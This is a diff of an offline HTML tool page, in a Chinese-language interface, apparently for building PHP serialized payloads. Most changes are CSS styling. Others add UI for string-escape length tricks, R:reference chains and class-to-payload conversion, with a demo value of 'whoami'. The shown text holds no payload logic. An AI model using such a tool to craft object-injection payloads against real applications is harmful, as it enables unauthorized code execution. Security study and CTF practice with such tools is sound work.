@@ -1,4 +1,4 @@
-﻿<!doctype html>
+<!doctype html>
 <html lang="zh-CN">
 
 <head>
@@ -8,25 +8,29 @@
   <style>
     :root {
       color-scheme: light;
-      --bg: #eef4f8;
+      --bg: #edf6f4;
       --panel: #ffffff;
-      --text: #16202b;
-      --muted: #647386;
-      --line: #d8e1ea;
+      --panel-soft: rgba(255, 255, 255, 0.78);
+      --text: #14212d;
+      --muted: #65768a;
+      --line: #d4e2ea;
       --accent: #0f766e;
-      --accent-strong: #0b5f59;
-      --accent-soft: #e5f6f3;
-      --ink: #243041;
+      --accent-strong: #075e57;
+      --accent-soft: #e1f5f0;
+      --ink: #223244;
       --warn: #b45309;
-      --shadow: 0 18px 45px rgba(36, 48, 65, 0.1);
+      --danger: #b42318;
+      --shadow: 0 22px 55px rgba(21, 48, 61, 0.12);
+      --shadow-soft: 0 12px 30px rgba(21, 48, 61, 0.08);
       --mono: Consolas, "Cascadia Mono", "Microsoft YaHei UI", monospace;
       --sans: "Microsoft YaHei UI", "Microsoft YaHei", Arial, sans-serif;
     }
 
     [data-theme="dark"] {
       color-scheme: dark;
-      --bg: #000000;
-      --panel: #111827;
+      --bg: #07110f;
+      --panel: #101923;
+      --panel-soft: rgba(16, 25, 35, 0.78);
       --text: #e5e7eb;
       --muted: #b0b8c4;
       --line: #374151;
@@ -35,19 +39,22 @@
       --accent-soft: #064e3b;
       --ink: #f3f4f6;
       --warn: #f59e0b;
+      --danger: #f87171;
       --shadow: 0 18px 45px rgba(0, 0, 0, 0.5);
+      --shadow-soft: 0 12px 30px rgba(0, 0, 0, 0.35);
     }
 
     [data-theme="dark"] body {
-      background: #000000;
-      background-image: none;
+      background:
+        radial-gradient(circle at 8% 4%, rgba(16, 185, 129, 0.18), transparent 30%),
+        radial-gradient(circle at 92% 12%, rgba(245, 158, 11, 0.12), transparent 28%),
+        linear-gradient(135deg, #07110f 0%, #0b1117 46%, #111827 100%);
     }
 
     [data-theme="dark"] header {
-      background: #0a0a0a;
-      border-bottom-color: #1a1a1a;
-      box-shadow: none;
-      backdrop-filter: none;
+      background: rgba(10, 14, 18, 0.78);
+      border-bottom-color: rgba(55, 65, 81, 0.7);
+      box-shadow: 0 1px 0 rgba(255, 255, 255, 0.04) inset;
     }
 
     [data-theme="dark"] h1 {
@@ -100,7 +107,7 @@
     [data-theme="dark"] textarea,
     [data-theme="dark"] select {
       background: #1f2937;
-      border-color: #374151;
+      border: 1px solid #374151;
       color: #e5e7eb;
     }
 
@@ -128,7 +135,7 @@
     [data-theme="dark"] .btn.secondary,
     [data-theme="dark"] .mini-btn.secondary {
       background: #1f2937;
-      border-color: #374151;
+      border: 1px solid #374151;
       color: #e5e7eb;
     }
 
@@ -139,7 +146,7 @@
 
     [data-theme="dark"] .template-btn {
       background: linear-gradient(180deg, #1f2937, #111827);
-      border-color: #374151;
+      border: 1px solid #374151;
       color: #e5e7eb;
     }
 
@@ -150,6 +157,29 @@
 
     [data-theme="dark"] .template-btn small {
       color: #9ca3af;
+    }
+
+    [data-theme="dark"] .quick-panel {
+      background:
+        linear-gradient(135deg, rgba(16, 185, 129, 0.12), transparent 42%),
+        linear-gradient(180deg, #111827, #0f1623);
+      border-color: #374151;
+    }
+
+    [data-theme="dark"] .quick-title,
+    [data-theme="dark"] .template-group-title {
+      color: #e5e7eb;
+    }
+
+    [data-theme="dark"] .quick-btn {
+      background: #1f2937;
+      border: 1px solid #374151;
+      color: #e5e7eb;
+    }
+
+    [data-theme="dark"] .quick-btn:hover {
+      background: #374151;
+      border-color: var(--accent);
     }
 
     [data-theme="dark"] .stat {
@@ -172,7 +202,7 @@
 
     [data-theme="dark"] .encode-option {
       background: #1f2937;
-      border-color: #374151;
+      border: 1px solid #374151;
       color: #e5e7eb;
     }
 
@@ -183,13 +213,13 @@
 
     [data-theme="dark"] .payload {
       background: #1f2937;
-      border-color: #374151;
+      border: 1px solid #374151;
       color: #e5e7eb;
     }
 
     [data-theme="dark"] .query-value {
       background: #1f2937;
-      border-color: #374151;
+      border: 1px solid #374151;
       color: #e5e7eb;
     }
 
@@ -219,7 +249,9 @@
     }
 
     [data-theme="dark"] .exploit-section {
-      background: linear-gradient(180deg, #111827, #0f1623);
+      background:
+        linear-gradient(135deg, rgba(16, 185, 129, 0.12), transparent 42%),
+        linear-gradient(180deg, #111827, #0f1623);
       border-color: #1f2937;
     }
 
@@ -228,7 +260,7 @@
     }
 
     [data-theme="dark"] .exploit-diff {
-      background: #1f2937;
+      background: rgba(31, 41, 55, 0.86);
       border-color: #374151;
     }
 
@@ -237,8 +269,28 @@
     }
 
     [data-theme="dark"] .count-row {
-      background: #1f2937;
+      background: rgba(31, 41, 55, 0.88);
       border-color: #374151;
+    }
+
+    [data-theme="dark"] .ref-prop-row:has(.ref-check:checked) {
+      background:
+        linear-gradient(90deg, rgba(16, 185, 129, 0.18), transparent 52%),
+        rgba(31, 41, 55, 0.94);
+    }
+
+    [data-theme="dark"] .ref-target-name,
+    [data-theme="dark"] #ref-details {
+      color: #e5e7eb;
+    }
+
+    [data-theme="dark"] .ref-preview {
+      color: #b0b8c4;
+    }
+
+    [data-theme="dark"] .ref-badge {
+      border-color: rgba(16, 185, 129, 0.35);
+      color: #6ee7b7;
     }
 
     [data-theme="dark"] .count-class {
@@ -247,7 +299,7 @@
 
     [data-theme="dark"] .count-btn {
       background: #1f2937;
-      border-color: #374151;
+      border: 1px solid #374151;
       color: #e5e7eb;
     }
 
@@ -264,8 +316,9 @@
       margin: 0;
       min-height: 100vh;
       background:
-        linear-gradient(135deg, rgba(15, 118, 110, 0.08), transparent 34%),
-        linear-gradient(225deg, rgba(180, 83, 9, 0.08), transparent 36%),
+        radial-gradient(circle at 8% 6%, rgba(15, 118, 110, 0.16), transparent 28%),
+        radial-gradient(circle at 92% 10%, rgba(180, 83, 9, 0.12), transparent 28%),
+        linear-gradient(135deg, rgba(255, 255, 255, 0.7), transparent 45%),
         repeating-linear-gradient(0deg, rgba(36, 48, 65, 0.035) 0 1px, transparent 1px 28px),
         var(--bg);
       color: var(--text);
@@ -273,14 +326,18 @@
     }
 
     header {
+      position: sticky;
+      top: 0;
+      z-index: 10;
       border-bottom: 1px solid var(--line);
-      background: rgba(255, 255, 255, 0.86);
-      backdrop-filter: blur(14px);
+      background: rgba(255, 255, 255, 0.82);
+      backdrop-filter: blur(18px);
       box-shadow: 0 1px 0 rgba(255, 255, 255, 0.9) inset;
     }
 
     .wrap {
-      width: min(1600px, calc(100% - 32px));
+      width: calc(100% - 16px);
+      max-width: none;
       margin: 0 auto;
     }
 
@@ -305,9 +362,10 @@
       width: 48px;
       height: 48px;
       place-items: center;
-      border-radius: 8px;
+      border-radius: 16px;
       color: #fff;
       font: 800 14px var(--mono);
+      box-shadow: 0 12px 28px rgba(15, 118, 110, 0.22);
     }
 
     h1 {
@@ -328,12 +386,13 @@
       display: inline-flex;
       align-items: center;
       gap: 8px;
-      padding: 8px 12px;
+      padding: 9px 14px;
       border: 1px solid var(--line);
       border-radius: 999px;
       color: #31524f;
-      background: var(--accent-soft);
-      font-size: 15px;
+      background: rgba(225, 245, 240, 0.86);
+      box-shadow: var(--shadow-soft);
+      font-size: 14px;
       font-weight: 650;
       white-space: nowrap;
     }
@@ -359,75 +418,94 @@
     }
 
     main {
-      padding: 28px 0 18px;
+      padding: 32px 0 20px;
     }
 
     .grid {
       display: grid;
-      grid-template-columns: minmax(0, 1fr) minmax(420px, 1fr);
-      gap: 18px;
+      grid-template-columns: minmax(760px, 1.38fr) minmax(470px, 0.82fr);
+      gap: 16px;
+      align-items: stretch;
+    }
+
+    .grid.mode-exploit-active {
+      grid-template-columns: minmax(800px, 1.48fr) minmax(470px, 0.76fr);
       align-items: start;
     }
 
     .panel {
       border: 1px solid var(--line);
-      border-radius: 8px;
-      background: var(--panel);
+      border-radius: 18px;
+      background: var(--panel-soft);
       box-shadow: var(--shadow);
       overflow: hidden;
+      backdrop-filter: blur(10px);
     }
 
     .panel-head {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      gap: 12px;
-      padding: 14px 16px;
+      gap: 16px;
+      padding: 18px 20px;
       border-bottom: 1px solid var(--line);
-      background: linear-gradient(180deg, #fbfdff, #f7fafc);
+      background:
+        linear-gradient(135deg, rgba(15, 118, 110, 0.08), transparent 46%),
+        linear-gradient(180deg, rgba(255, 255, 255, 0.96), rgba(247, 250, 252, 0.9));
     }
 
     .panel-title {
       margin: 0;
-      font-size: 19px;
-      font-weight: 700;
+      font-size: 20px;
+      font-weight: 780;
+      letter-spacing: 0.01em;
     }
 
     .panel-body {
-      padding: 16px;
+      padding: 18px;
     }
 
     .tabs {
       display: inline-flex;
       flex-wrap: wrap;
-      gap: 4px;
-      padding: 4px;
+      gap: 6px;
+      padding: 5px;
       border: 1px solid var(--line);
-      border-radius: 8px;
-      background: #eef3f8;
+      border-radius: 14px;
+      background: rgba(238, 243, 248, 0.88);
       box-shadow: inset 0 1px 2px rgba(36, 48, 65, 0.05);
     }
 
     .tab {
       border: 0;
-      border-radius: 6px;
-      padding: 10px 14px;
+      border-radius: 10px;
+      padding: 10px 15px;
       background: transparent;
       color: var(--muted);
       cursor: pointer;
-      font: 600 16px var(--sans);
-      transition: background 0.16s ease, color 0.16s ease, box-shadow 0.16s ease;
+      font: 700 15px var(--sans);
+      transition: background 0.16s ease, color 0.16s ease, box-shadow 0.16s ease, transform 0.16s ease;
     }
 
     .tab.active {
       background: #fff;
       color: var(--accent-strong);
-      box-shadow: 0 1px 4px rgba(15, 23, 42, 0.1);
+      box-shadow: 0 8px 18px rgba(15, 23, 42, 0.1);
+      transform: translateY(-1px);
     }
 
     .form {
       display: grid;
       gap: 14px;
+      align-content: start;
+    }
+
+    .mode-panel {
+      min-height: 430px;
+    }
+
+    #mode-oneclick {
+      min-height: 0;
     }
 
     label {
@@ -443,7 +521,7 @@
     select {
       width: 100%;
       border: 1px solid #cbd5e1;
-      border-radius: 7px;
+      border-radius: 12px;
       padding: 12px 14px;
       background: #fff;
       color: var(--text);
@@ -457,7 +535,9 @@
       resize: vertical;
       font-family: var(--mono);
       line-height: 1.5;
-      background: #fbfdff;
+      background:
+        linear-gradient(180deg, rgba(15, 118, 110, 0.025), transparent 32%),
+        #fbfdff;
     }
 
     input:focus,
@@ -495,8 +575,8 @@
     .mini-btn,
     .btn {
       border: 1px solid var(--accent);
-      border-radius: 7px;
-      background: var(--accent);
+      border-radius: 12px;
+      background: linear-gradient(180deg, #12857c, var(--accent));
       color: #fff;
       cursor: pointer;
       font: 700 14px var(--sans);
@@ -521,7 +601,7 @@
     .btn.secondary,
     .mini-btn.secondary {
       border-color: #cbd5e1;
-      background: #fff;
+      background: rgba(255, 255, 255, 0.92);
       color: #334155;
       box-shadow: 0 6px 14px rgba(36, 48, 65, 0.06);
     }
@@ -535,7 +615,7 @@
     .actions {
       display: flex;
       flex-wrap: wrap;
-      gap: 8px;
+      gap: 10px;
       align-items: center;
     }
 
@@ -550,17 +630,17 @@
     .codec-toggle {
       display: inline-grid;
       grid-template-columns: repeat(2, minmax(62px, 1fr));
-      gap: 4px;
-      padding: 4px;
+      gap: 6px;
+      padding: 5px;
       border: 1px solid var(--line);
-      border-radius: 8px;
+      border-radius: 14px;
       background: #eef3f8;
       box-shadow: inset 0 1px 2px rgba(36, 48, 65, 0.05);
     }
 
     .codec-mode {
       border: 0;
-      border-radius: 6px;
+      border-radius: 10px;
       padding: 10px 14px;
       background: transparent;
       color: var(--muted);
@@ -572,7 +652,7 @@
     .codec-mode.active {
       background: #fff;
       color: var(--accent-strong);
-      box-shadow: 0 1px 4px rgba(15, 23, 42, 0.1);
+      box-shadow: 0 8px 18px rgba(15, 23, 42, 0.1);
     }
 
     .left-stack {
@@ -584,6 +664,40 @@
       display: grid;
       gap: 12px;
       align-content: start;
+      position: sticky;
+      top: 104px;
+      overscroll-behavior: contain;
+      padding-right: 2px;
+      scrollbar-gutter: stable;
+    }
+
+    .grid:not(.mode-exploit-active) .left-stack,
+    .grid:not(.mode-exploit-active) .right-stack {
+      height: 100%;
+    }
+
+    .grid:not(.mode-exploit-active) .left-stack>.panel:first-child,
+    .grid:not(.mode-exploit-active) .query-panel {
+      height: 100%;
+    }
+
+    .grid:not(.mode-exploit-active) .right-stack {
+      grid-template-rows: auto minmax(0, 1fr);
+    }
+
+    .grid.mode-exploit-active .right-stack {
+      align-self: start;
+      max-height: calc(100vh - 116px);
+      overflow-y: auto;
+    }
+
+    .right-stack .panel-head {
+      align-items: flex-start;
+      flex-wrap: wrap;
+    }
+
+    .right-stack .actions {
+      gap: 8px;
     }
 
     .grid {
@@ -592,18 +706,18 @@
 
     .output-tabs {
       display: inline-flex;
-      gap: 4px;
+      gap: 6px;
       width: fit-content;
-      padding: 4px;
+      padding: 5px;
       border: 1px solid var(--line);
-      border-radius: 8px;
+      border-radius: 14px;
       background: #eef3f8;
       box-shadow: inset 0 1px 2px rgba(36, 48, 65, 0.05);
     }
 
     .output-tab {
       border: 0;
-      border-radius: 6px;
+      border-radius: 10px;
       padding: 10px 16px;
       background: transparent;
       color: var(--muted);
@@ -615,7 +729,7 @@
     .output-tab.active {
       background: #fff;
       color: var(--accent-strong);
-      box-shadow: 0 1px 4px rgba(15, 23, 42, 0.1);
+      box-shadow: 0 8px 18px rgba(15, 23, 42, 0.1);
     }
 
     .query-builder {
@@ -660,7 +774,7 @@
     }
 
     .payload {
-      min-height: 190px;
+      min-height: 136px;
       white-space: pre-wrap;
       word-break: break-all;
       border-color: #b7c8d8;
@@ -673,14 +787,15 @@
     .stats {
       display: grid;
       grid-template-columns: repeat(3, minmax(0, 1fr));
-      gap: 10px;
+      gap: 8px;
     }
 
     .stat {
       border: 1px solid var(--line);
-      border-radius: 8px;
-      padding: 12px;
+      border-radius: 14px;
+      padding: 10px 12px;
       background: linear-gradient(180deg, #fbfdff, #f6faf9);
+      box-shadow: 0 8px 18px rgba(36, 48, 65, 0.04);
     }
 
     .stat span {
@@ -708,17 +823,88 @@
     }
 
     .hidden {
-      display: none;
+      display: none !important;
     }
 
     .exploit-section {
-      padding: 16px;
+      position: relative;
+      padding: 16px 16px 16px 18px;
       border: 1px solid var(--line);
-      border-radius: 8px;
-      background: linear-gradient(180deg, #fbfdff, #f7fafc);
+      border-radius: 16px;
+      background:
+        linear-gradient(135deg, rgba(15, 118, 110, 0.07), transparent 42%),
+        linear-gradient(180deg, rgba(255, 255, 255, 0.96), rgba(247, 250, 252, 0.9));
+      box-shadow: var(--shadow-soft);
+      overflow: hidden;
+    }
+
+    .mode-exploit-active .payload {
+      min-height: 135px;
+    }
+
+    .query-panel {
+      margin-top: 0;
+    }
+
+    .quick-panel {
+      display: grid;
+      gap: 10px;
+      padding: 14px;
+      border: 1px solid var(--line);
+      border-radius: 14px;
+      background:
+        linear-gradient(135deg, rgba(15, 118, 110, 0.055), transparent 42%),
+        rgba(255, 255, 255, 0.72);
+    }
+
+    .quick-title {
+      margin: 0;
+      color: var(--ink);
+      font-size: 15px;
+      font-weight: 760;
+    }
+
+    .quick-grid {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 8px;
+    }
+
+    .quick-btn {
+      min-height: 42px;
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.86);
+      color: var(--ink);
+      cursor: pointer;
+      font: 700 13px var(--sans);
+      text-align: left;
+      padding: 8px 10px;
+      transition: border-color 0.15s, background 0.15s, transform 0.15s;
+    }
+
+    .quick-btn:hover {
+      border-color: var(--accent);
+      background: var(--accent-soft);
+      transform: translateY(-1px);
+    }
+
+    .oneclick-input {
+      min-height: 560px;
+      height: min(62vh, 700px);
+    }
+
+    .exploit-section::before {
+      content: "";
+      position: absolute;
+      inset: 0 auto 0 0;
+      width: 4px;
+      background: linear-gradient(180deg, var(--accent), rgba(180, 83, 9, 0.65));
+      opacity: 0.72;
     }
 
     .exploit-header {
+      position: relative;
       display: flex;
       align-items: center;
       justify-content: space-between;
@@ -729,17 +915,17 @@
 
     .exploit-title {
       margin: 0;
-      font-size: 16px;
-      font-weight: 700;
+      font-size: 17px;
+      font-weight: 780;
       color: var(--ink);
     }
 
     .exploit-tag {
       display: inline-flex;
       align-items: center;
-      padding: 3px 8px;
+      padding: 4px 9px;
       border: 1px solid var(--accent);
-      border-radius: 4px;
+      border-radius: 999px;
       background: var(--accent-soft);
       color: var(--accent-strong);
       font-size: 12px;
@@ -752,8 +938,8 @@
       margin-top: 12px;
       padding: 12px;
       border: 1px solid var(--line);
-      border-radius: 6px;
-      background: var(--panel);
+      border-radius: 14px;
+      background: rgba(255, 255, 255, 0.82);
       overflow-x: auto;
     }
 
@@ -785,10 +971,11 @@
       grid-template-columns: 1fr auto 100px auto;
       gap: 10px;
       align-items: center;
-      padding: 8px 12px;
+      padding: 10px 12px;
       border: 1px solid var(--line);
-      border-radius: 6px;
-      background: var(--panel);
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.86);
+      box-shadow: 0 8px 18px rgba(36, 48, 65, 0.04);
     }
 
     .count-class {
@@ -814,7 +1001,7 @@
       width: 32px;
       height: 32px;
       border: 1px solid var(--line);
-      border-radius: 6px;
+      border-radius: 10px;
       background: var(--panel);
       color: var(--ink);
       font: 700 16px var(--sans);
@@ -830,11 +1017,76 @@
       border-color: var(--accent);
     }
 
+    .ref-prop-row {
+      grid-template-columns: auto minmax(180px, 1fr) auto minmax(180px, 0.9fr);
+      border-color: rgba(15, 118, 110, 0.16);
+    }
+
+    .ref-prop-row .count-class {
+      padding-left: calc(var(--ref-depth, 0) * 16px);
+    }
+
+    .ref-prop-row:has(.ref-check:checked) {
+      border-color: var(--accent);
+      background:
+        linear-gradient(90deg, rgba(15, 118, 110, 0.11), transparent 48%),
+        rgba(255, 255, 255, 0.95);
+    }
+
+    .ref-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 52px;
+      padding: 4px 8px;
+      border: 1px solid rgba(15, 118, 110, 0.22);
+      border-radius: 999px;
+      background: var(--accent-soft);
+      color: var(--accent-strong);
+      font: 700 12px var(--mono);
+      white-space: nowrap;
+    }
+
+    .ref-preview {
+      min-width: 0;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      color: var(--muted);
+      font: 12px var(--mono);
+    }
+
+    .ref-target-row {
+      grid-template-columns: minmax(180px, 0.9fr) minmax(220px, 1.1fr);
+      border-color: rgba(180, 83, 9, 0.18);
+    }
+
+    .ref-target-name {
+      min-width: 0;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      color: var(--ink);
+      font: 700 13px var(--sans);
+    }
+
+    .ref-error {
+      color: var(--danger);
+      font-weight: 700;
+    }
+
+    #ref-details {
+      color: var(--accent-strong);
+      font: 13px var(--mono);
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
     .manual-url {
       margin-top: 12px;
       padding: 14px;
       border: 1px solid var(--line);
-      border-radius: 8px;
+      border-radius: 14px;
       background: linear-gradient(180deg, #fbfdff, #f7fafc);
     }
 
@@ -863,10 +1115,10 @@
       display: inline-flex;
       align-items: center;
       gap: 6px;
-      padding: 6px 10px;
+      padding: 7px 11px;
       border: 1px solid var(--line);
-      border-radius: 6px;
-      background: #fff;
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.88);
       cursor: pointer;
       font: 14px var(--mono);
       color: var(--ink);
@@ -898,22 +1150,42 @@
       font-size: 13px;
     }
 
-    .templates {
+    .templates,
+    .template-grid {
       display: grid;
-      grid-template-columns: repeat(2, minmax(0, 1fr));
+      grid-template-columns: repeat(4, minmax(0, 1fr));
       gap: 10px;
+    }
+
+    .template-library {
+      display: grid;
+      gap: 18px;
+    }
+
+    .template-group {
+      display: grid;
+      gap: 10px;
+    }
+
+    .template-group-title {
+      margin: 0;
+      color: var(--ink);
+      font-size: 17px;
+      font-weight: 780;
     }
 
     .template-btn {
       border: 1px solid var(--line);
-      border-radius: 8px;
-      background: linear-gradient(180deg, #fff, #fbfdff);
+      border-radius: 16px;
+      background:
+        linear-gradient(135deg, rgba(15, 118, 110, 0.055), transparent 42%),
+        linear-gradient(180deg, #fff, #fbfdff);
       padding: 16px;
       color: #253244;
       text-align: left;
       cursor: pointer;
       font: 650 16px var(--sans);
-      box-shadow: 0 8px 18px rgba(36, 48, 65, 0.05);
+      box-shadow: var(--shadow-soft);
       transition: transform 0.16s ease, border-color 0.16s ease, background 0.16s ease;
     }
 
@@ -929,6 +1201,17 @@
       border-color: var(--accent);
       background: #f4fbfa;
       transform: translateY(-1px);
+    }
+
+    [data-theme="dark"] .template-btn {
+      background: linear-gradient(180deg, #1f2937, #111827);
+      border: 1px solid #374151;
+      color: #e5e7eb;
+    }
+
+    [data-theme="dark"] .template-btn:hover {
+      background: #374151;
+      border-color: var(--accent);
     }
 
     footer {
@@ -960,7 +1243,7 @@
       color: var(--muted);
     }
 
-    @media (max-width: 1080px) {
+    @media (max-width: 1120px) {
       .topbar {
         align-items: flex-start;
         flex-direction: column;
@@ -974,22 +1257,41 @@
       .grid {
         grid-template-columns: 1fr;
       }
+
+      .grid.mode-exploit-active {
+        grid-template-columns: 1fr;
+      }
+
+      .right-stack {
+        position: static;
+      }
+
+      header {
+        position: static;
+      }
     }
 
     @media (max-width: 640px) {
       .wrap {
-        width: min(100% - 20px, 1180px);
+        width: calc(100% - 16px);
       }
 
       .panel-head {
         align-items: flex-start;
         flex-direction: column;
+        padding: 16px;
+      }
+
+      .panel-body {
+        padding: 16px;
       }
 
       .row,
       .triple,
       .stats,
       .templates,
+      .template-grid,
+      .quick-grid,
       .query-head {
         grid-template-columns: 1fr;
       }
@@ -1009,6 +1311,39 @@
       .tabs {
         grid-template-columns: repeat(2, 1fr);
       }
+
+      .tab,
+      .codec-mode,
+      .output-tab {
+        flex: 1 1 calc(50% - 8px);
+        text-align: center;
+      }
+
+      .actions {
+        align-items: stretch;
+      }
+
+      .actions .btn,
+      .actions .mini-btn {
+        flex: 1 1 auto;
+      }
+
+      .ref-prop-row,
+      .ref-target-row,
+      .count-row {
+        grid-template-columns: 1fr;
+      }
+
+      .ref-prop-row .ref-check {
+        width: 18px;
+      }
+
+      .ref-badge,
+      .ref-preview,
+      .ref-target-name {
+        justify-self: start;
+        max-width: 100%;
+      }
     }
   </style>
 </head>
@@ -1026,7 +1361,7 @@
         </div>
       </div>
       <div class="badge">本地离线工具 · 自动计算字符串字节长度</div>
-      <button class="theme-toggle" id="theme-toggle" type="button" title="切换暗色模式">🌙</button>
+      <button class="theme-toggle" id="theme-toggle" type="button" title="切换暗色模式">&#127769;</button>
     </div>
   </header>
 
@@ -1037,7 +1372,7 @@
           <div class="panel-head">
             <h2 class="panel-title">构造区</h2>
             <div class="tabs" role="tablist">
-              <button class="tab active" data-mode="string" type="button">字符串</button>
+              <button class="tab active" data-mode="string" type="button">基础值</button>
               <button class="tab" data-mode="array" type="button">数组</button>
               <button class="tab" data-mode="object" type="button">对象</button>
               <button class="tab" data-mode="manual" type="button">修正</button>
@@ -1053,9 +1388,20 @@
                   类型
                   <select id="single-type">
                     <option value="string">string</option>
+                    <option value="empty_string">empty string</option>
                     <option value="int">int</option>
+                    <option value="float">float/double</option>
                     <option value="bool">bool</option>
                     <option value="null">null</option>
+                    <option value="empty_array">empty array</option>
+                    <option value="empty_object">empty object</option>
+                    <option value="stdclass">stdClass object</option>
+                    <option value="object_class">empty named object</option>
+                    <option value="array_raw">raw array fragment</option>
+                    <option value="object_raw">raw object fragment</option>
+                    <option value="reference">R:reference</option>
+                    <option value="soft_reference">r:object reference</option>
+                    <option value="serialized">已序列化片段</option>
                     <option value="raw">raw</option>
                   </select>
                 </label>
@@ -1069,6 +1415,24 @@
                 <button class="btn secondary" id="load-demo-string" type="button">示例</button>
                 <button class="btn secondary" id="send-string-to-query" type="button">发送为URL查询新参数</button>
               </div>
+              <p class="note">raw array fragment 填连续的“键+值”已序列化片段；raw object fragment 可填
+                <code>类名|属性名片段+属性值片段</code>，不写类名时默认 User。
+              </p>
+              <div class="quick-panel">
+                <h3 class="quick-title">常用基础值</h3>
+                <div class="quick-grid">
+                  <button class="quick-btn" type="button" data-single-demo="string:system">string: system</button>
+                  <button class="quick-btn" type="button" data-single-demo="int:1">int: 1</button>
+                  <button class="quick-btn" type="button" data-single-demo="float:3.14">float: 3.14</button>
+                  <button class="quick-btn" type="button" data-single-demo="bool:true">bool: true</button>
+                  <button class="quick-btn" type="button" data-single-demo="null:">null</button>
+                  <button class="quick-btn" type="button" data-single-demo="empty_array:">a:0:{}</button>
+                  <button class="quick-btn" type="button" data-single-demo="empty_object:stdClass">stdClass 空对象</button>
+                  <button class="quick-btn" type="button" data-single-demo="reference:1">R:1;</button>
+                  <button class="quick-btn" type="button"
+                    data-single-demo="serialized:O:4:&quot;User&quot;:0:{}">已序列化片段</button>
+                </div>
+              </div>
             </div>
 
             <div id="mode-array" class="form mode-panel hidden">
@@ -1079,6 +1443,14 @@
                 <button class="btn secondary" id="send-array-to-query" type="button">发送为URL查询新参数</button>
               </div>
               <p class="note">键支持 string/int；值支持 string/int/bool/null/raw。</p>
+              <div class="quick-panel">
+                <h3 class="quick-title">数组结构快捷填充</h3>
+                <div class="quick-grid">
+                  <button class="quick-btn" type="button" id="load-array-login">登录键值</button>
+                  <button class="quick-btn" type="button" id="load-array-call">函数调用参数</button>
+                  <button class="quick-btn" type="button" id="load-array-mixed">混合类型数组</button>
+                </div>
+              </div>
             </div>
 
             <div id="mode-object" class="form mode-panel hidden">
@@ -1093,6 +1465,14 @@
                 <button class="btn secondary" id="send-to-query" type="button">发送为URL查询新参数</button>
               </div>
               <p class="note">选择private或protected时，工具会自动按PHP序列化规则处理属性名；界面里只需要填写普通属性名。</p>
+              <div class="quick-panel">
+                <h3 class="quick-title">对象结构快捷填充</h3>
+                <div class="quick-grid">
+                  <button class="quick-btn" type="button" id="load-object-public">多 public 属性</button>
+                  <button class="quick-btn" type="button" id="load-object-visibility">private/protected</button>
+                  <button class="quick-btn" type="button" id="load-object-raw">raw 嵌套片段</button>
+                </div>
+              </div>
             </div>
 
             <div id="mode-manual" class="form mode-panel hidden">
@@ -1103,20 +1483,28 @@
               <div class="actions">
                 <button class="btn" id="fix-lengths" type="button">修正 s 长度</button>
                 <button class="btn secondary" id="parse-serialized" type="button">反向解析</button>
-                <button class="btn secondary" id="copy-as-php-class" type="button">复制为PHP类</button>
-                <button class="btn secondary" id="pseudo-to-php" type="button">伪代码→PHP</button>
+                <button class="btn secondary" id="copy-as-php-class" type="button">伪代码→PHP类拆分解析</button>
+                <button class="btn secondary" id="pseudo-to-php" type="button">伪代码→PHP修正</button>
                 <button class="btn secondary" id="decode-url-input" type="button">URL解码</button>
                 <button class="btn secondary" id="decode-base64-input" type="button">Base64解码</button>
                 <button class="btn secondary" id="send-manual-to-query" type="button">发送为URL查询新参数</button>
               </div>
               <p class="note">修正功能会扫描 <span class="warn">s:数字:"内容";</span> 和 <span class="warn">O:数字:"类名":</span> 的长度，按
                 UTF-8 字节数重新计算。</p>
+              <div class="quick-panel">
+                <h3 class="quick-title">修正常用样例</h3>
+                <div class="quick-grid">
+                  <button class="quick-btn" type="button" id="load-manual-newline">含换行字符串</button>
+                  <button class="quick-btn" type="button" id="load-manual-escape">字符串逃逸闭合</button>
+                  <button class="quick-btn" type="button" id="load-manual-private">私有属性长度</button>
+                </div>
+              </div>
             </div>
 
             <div id="mode-oneclick" class="form mode-panel hidden">
               <label>
                 粘贴PHP类代码
-                <textarea id="php-class-input" spellcheck="false" style="min-height:150px;">class DemoByZekon{
+                <textarea id="php-class-input" class="oneclick-input" spellcheck="false">class DemoByZekon{
     public $a = "admin";
     public $b = "whoami";
     public $c = 1;
@@ -1166,8 +1554,7 @@
                   <p class="note">输入源串和替换规则，自动计算替换后完整串、字节差值。</p>
                   <label>
                     源序列化串
-                    <textarea id="escape-source" spellcheck="false"
-                      placeholder='粘贴原始序列化串，或点击「套用输出区」'></textarea>
+                    <textarea id="escape-source" spellcheck="false" placeholder='粘贴原始序列化串，或点击「套用输出区」'></textarea>
                   </label>
                   <div class="actions" style="margin-bottom:12px;">
                     <button class="btn secondary" id="escape-load-output" type="button">套用输出区当前内容</button>
@@ -1208,7 +1595,8 @@
                     <button class="btn secondary" id="escape-copy-after" type="button">复制替换后串</button>
                     <button class="btn secondary" id="escape-to-query" type="button">发送为URL查询新参数</button>
                   </div>
-                  <div class="exploit-diff hidden" id="escape-compare-box" style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
+                  <div class="exploit-diff hidden" id="escape-compare-box"
+                    style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
                     <div>
                       <div style="font-weight:700;margin-bottom:6px;color:var(--accent-strong);">替换前</div>
                       <pre id="escape-compare-before" style="margin:0;min-height:100px;"></pre>
@@ -1225,10 +1613,12 @@
                     <h3 class="exploit-title">引用链 (R:reference)</h3>
                     <span class="exploit-tag">R:N = 第N个被反序列化的元素</span>
                   </div>
-                  <p class="note">PHP 按反序列化顺序给每个元素（对象/数组/字符串等）编号。R:1 = 第1个被创建的元素。</p>
+                  <p class="note">PHP 按反序列化顺序给对象、数组和字符串值编号。R:1 通常是根对象/根数组；键名和属性名不作为引用目标。替换字段只能指向它之前已经创建的目标，所以第一个属性值通常从
+                    R:2 起可被后续字段引用。</p>
                   <label>
                     序列化串
-                    <textarea id="ref-source" spellcheck="false" style="min-height:60px;" placeholder='粘贴序列化串，或点击「读取输出区」'></textarea>
+                    <textarea id="ref-source" spellcheck="false" style="min-height:60px;"
+                      placeholder='粘贴序列化串，或点击「读取输出区」'></textarea>
                   </label>
                   <div class="actions" style="margin-bottom:8px;">
